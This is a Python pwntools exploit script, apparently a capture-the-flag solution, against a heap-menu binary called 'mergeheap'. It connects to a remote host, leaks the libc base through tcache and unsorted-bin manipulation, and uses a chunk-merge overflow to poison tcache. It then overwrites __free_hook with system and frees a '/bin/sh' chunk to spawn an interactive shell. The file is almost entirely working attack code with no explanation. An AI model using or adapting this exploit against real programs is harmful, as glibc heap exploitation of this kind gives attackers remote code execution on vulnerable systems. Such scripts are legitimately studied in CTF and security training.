from pwn import *
p=process('./mergeheap')
p=remote('152.136.210.218',7446)
elf=ELF('./mergeheap')

def add(content):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(len(content)))
    p.recvuntil(':')
    p.send(content)
def ladd(lenth,content):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(lenth))
    p.recvuntil(':')
    p.sendline(content)
def delete(idx):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(idx))
def show(idx):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(idx))
def merge(idx0,idx1):
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil(':')
    p.sendline(str(idx0))
    p.recvuntil(':')
    p.sendline(str(idx1))


# leak libc
add(0x200*'\x00') #0
add(0x200*'\x00') #1
add(0x200*'\x00') #2
add(0x200*'\x00') #3
add(0x200*'\x00') #4
add(0x200*'\x00') #5
add(0x200*'\x00') #6
add(0x200*'\x00') #7
add(0x200*'\x00') #8
add(0x200*'\x00') #9
for i in range(7):
    delete(1+i)#1~7
delete(8)#8
for i in range(7):
    add(0x200*'e')
add('aaaaaaaa')
show(8)
p.recvuntil('aaaaaaaa')
libc_base=u64(p.recv(6).ljust(8,'\x00'))-608-0x3EBC40
print hex(libc_base)

for i in range(7):
    delete(1+i)#1~7
delete(9)#9

#1
ladd(0x18,'\x91'*0x18)
#2
ladd(0x10,"\x91"*0x10)
#3
ladd(0x90,"1")
# 4 5 6
ladd(0x28,"28")
ladd(0x40,"40")
ladd(0x30,"40")
#7
ladd(0x20,"20")
delete(4)
merge(1,2)#change next chunk size to 0x91
delete(5)

for i in range(7):
    add(0x30*'q')
delete(5)
for i in range(6):
    delete(9+i)
delete(6)

free_hook=libc_base+0x3ed8e8
malloc_hook=libc_base+0x3ebc30
main_arena=libc_base+0x3EBC40+96
print hex(free_hook)
system=libc_base+0x4f440
# one_gadget=libc_base+0x4f2c5# 0x4f322 0x10a38c

payload='a'*0x40
payload+='\x00'*8
payload+='\x41'.ljust(8,'\x00')
payload+=p64(free_hook-0x10)   
ladd(0x80,payload)
for i in range(7):
    add(0x30*'q')
delete(1)
ladd(0x30,'/bin/sh\x00')
delete(2)
ladd(0x30,p64(system))
delete(1)
p.interactive()